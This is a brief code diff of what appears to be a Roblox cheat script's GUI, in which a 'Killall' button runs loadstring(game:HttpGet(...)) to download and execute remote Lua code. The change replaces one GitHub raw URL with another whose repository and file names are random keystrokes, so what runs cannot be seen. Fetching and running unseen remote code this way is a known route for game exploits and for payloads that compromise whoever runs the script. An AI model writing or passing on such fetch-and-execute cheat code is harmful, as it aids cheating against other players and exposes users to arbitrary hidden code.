@@ -134,7 +134,7 @@ Killall.TextScaled = true
 Killall.TextSize = 14.000
 Killall.TextWrapped = true
 Killall.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/WinningScript/Kill-all/main/KillALL",true))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/WinningScript/dADAFAFAFAFA/main/dasfasfasdas",true))()
 end)
 
 UICorner_5.Parent = Killall
